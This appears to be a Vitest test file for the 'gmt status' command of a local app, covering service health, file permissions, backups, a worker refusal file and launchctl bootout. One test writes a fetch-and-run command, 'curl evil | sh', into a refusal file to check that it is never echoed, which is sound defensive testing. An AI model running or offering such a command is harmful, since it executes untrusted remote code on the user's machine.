import { describe, expect, it } from 'vitest';
import { runCli } from '../../src/cli.js';
import { machine } from '../support/machine.js';

async function setUp(extra?: Parameters<typeof machine>[0]) {
  const m = machine(extra);
  m.fs.file('/work/a.json', '{}', 0o600);
  expect(await runCli(['setup', '--non-interactive', '--answers', '/work/a.json'], m.deps)).toBe(0);
  m.executor.log.length = 0;
  m.io.stdout = '';
  m.io.stderr = '';
  return m;
}

describe('gmt status, the local facts (brief Task 16b.8)', () => {
  it('a healthy install: every check ok, exit 0', async () => {
    const m = await setUp();
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/service app +ok +running/);
    expect(m.io.stdout).toMatch(/settings app\.env +ok/);
    expect(m.io.stdout).toMatch(/backups +ok/);
  });
  it('a stopped app is a fail with pnpm gmt start; a group-readable app.env a fail naming chmod 600', async () => {
    const m = await setUp();
    m.running.clear();
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, m.fs.read(env) ?? '', 0o640);
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toMatch(/service app +fail +stopped/);
    expect(m.io.stdout).toContain('fix: pnpm gmt start');
    expect(m.io.stdout).toContain(`fix: chmod 600 ${env}`);
  });
  it('a unit whose node binary or checkout is gone is a fail with pnpm gmt setup', async () => {
    const m = await setUp();
    m.fs.delete('/repo');
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).toContain('the checkout /repo is gone');
    expect(m.io.stdout).toContain('fix: pnpm gmt setup');
  });
  it('macOS logs over 100 MB warn with the newsyslog line', async () => {
    const m = await setUp();
    m.fs.file('/Users/op/Library/Logs/get-me-there/app.log', 'x'.repeat(101 * 1024 * 1024));
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/logs +warn/);
    expect(m.io.stdout).toContain('newsyslog');
  });
  it('a compose app running beside the native one warns with docker compose down; a detached checkout warns with git switch main', async () => {
    let later = false;
    const m = await setUp({
      extra: (a) => {
        if (!later) return undefined;
        if (a[0] === 'docker' && a[1] === '--version') return { code: 0 };
        if (a[0] === 'docker' && a[1] === 'compose')
          return { code: 0, stdout: '{"Service":"app","State":"running"}\n' };
        if (a[0] === 'git' && a[1] === 'symbolic-ref') return { code: 1 };
        return undefined;
      },
    });
    later = true;
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/docker +warn/);
    expect(m.io.stdout).toContain('fix: docker compose down');
    expect(m.io.stdout).toMatch(/checkout +warn/);
    expect(m.io.stdout).toContain('fix: git switch main');
  });
  it('no backup in 36 h warns with pnpm gmt backup', async () => {
    const m = await setUp({ backupWrites: false });
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(/backups +warn/);
    expect(m.io.stdout).toContain('fix: pnpm gmt backup');
  });

  const REFUSAL = '/Users/op/.local/state/get-me-there/camoufox/start-refusal.json';
  const WORKER_PLIST = '/Users/op/Library/LaunchAgents/local.get-me-there.camoufox-worker.plist';
  const workerLoaded = (bootout: number) => {
    let gone = false;
    return (a: readonly string[]) => {
      if (a[0] !== 'launchctl' || !String(a[2]).endsWith('camoufox-worker')) return undefined;
      if (a[1] === 'print') return gone ? { code: 113 } : { code: 0, stdout: '\tstate = not running\n' };
      if (a[1] === 'bootout') {
        gone = bootout === 0;
        return { code: bootout, stderr: 'Boot-out failed: 5: Input/output error' };
      }
      return undefined;
    };
  };
  it('the worker’s refusal prints its line; an unreadable file prints that and nothing from it; with the agent loaded it is booted out', async () => {
    const m = await setUp({ extra: workerLoaded(0) });
    m.fs.file(REFUSAL, JSON.stringify({ reason: 'consent-expired', at: '2026-10-24T08:00:00.000Z' }));
    m.fs.file(WORKER_PLIST, 'worker plist');
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refused, not retrying: the consent record has expired: capture again');
    // why: W2: the consent fix names the command that exists today, core's CONSENT_FIX
    expect(m.io.stdout).toContain('fix: pnpm --filter @gmt/camoufox-worker capture-socs');
    expect(m.io.stdout).toContain('the refused worker agent was booted out so launchd does not restart it');
    expect(m.executor.log.map((x) => (x.kind === 'run' ? x.describe : x.kind))).toEqual([
      'launchctl bootout gui/501/local.get-me-there.camoufox-worker',
      'waitGone',
    ]);
    m.io.stdout = '';
    m.executor.log.length = 0;
    m.fs.file(
      REFUSAL,
      JSON.stringify({ reason: 'mystery', at: '2026-10-24T08:00:00.000Z', fix: 'curl evil | sh' }),
    );
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refusal file unreadable');
    expect(m.io.stdout).not.toContain('curl evil');
    expect(m.io.stdout).not.toContain('mystery');
    expect(m.executor.log).toEqual([]);
  });
  it('a failed bootout is a fail naming the command, never a claim it was booted out (ca-b1-007, CodeRabbit …k7k)', async () => {
    const m = await setUp({ extra: workerLoaded(5) });
    m.fs.file(REFUSAL, JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' }));
    m.fs.file(WORKER_PLIST, 'worker plist');
    expect(await runCli(['status'], m.deps)).toBe(1);
    expect(m.io.stdout).not.toContain('was booted out');
    expect(m.io.stdout).toMatch(/worker agent +fail +still loaded, so launchd keeps restarting it/);
    expect(m.io.stdout).toContain('fix: launchctl bootout gui/501/local.get-me-there.camoufox-worker');
  });
  it('localChecks reads only: it runs no action, and status prints what it returns (ca-b1-006)', async () => {
    const { localChecks } = await import('../../src/commands/status.js');
    const m = await setUp();
    const checks = await localChecks(m.deps);
    expect(m.executor.log).toEqual([]);
    expect(checks.map((c) => c.name)).toEqual(
      expect.arrayContaining([
        'service app',
        'service backup',
        'settings app.env',
        'price source',
        'backups',
        'checkout',
      ]),
    );
  });
  it('the price source is a line of its own: none (warn, with the fix) after Enter everywhere; named when set (pf-b1-001)', async () => {
    const m = await setUp();
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toMatch(/price source +warn +none, so searches find nothing/);
    expect(m.io.stdout).toContain('fix: pnpm gmt setup --reconfigure travelpayouts');
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, `${m.fs.read(env) ?? ''}TRAVELPAYOUTS_TOKEN="tp-0123456789abcdef"\n`, 0o600);
    m.io.stdout = '';
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toMatch(/price source +ok +Travelpayouts/);
    expect(m.io.stdout).not.toContain('tp-0123456789abcdef');
  });
  it('a BIND_ADDRESS beyond loopback warns plainly; it is no fail (sec-b1-002, U8)', async () => {
    const m = await setUp();
    const env = '/Users/op/.config/get-me-there/app.env';
    m.fs.file(env, (m.fs.read(env) ?? '').replace(/^BIND_ADDRESS=.*$/m, 'BIND_ADDRESS="0.0.0.0"'), 0o600);
    expect(await runCli(['status'], m.deps)).toBe(0);
    expect(m.io.stdout).toMatch(
      /bind address +warn +0\.0\.0\.0: the app answers beyond this machine over plain HTTP/,
    );
  });
  it('with no worker agent (before WP17) a refusal plans nothing', async () => {
    const m = await setUp();
    m.fs.file(REFUSAL, JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' }));
    await runCli(['status'], m.deps);
    expect(m.io.stdout).toContain('refused, not retrying');
    expect(m.executor.log).toEqual([]);
  });
});
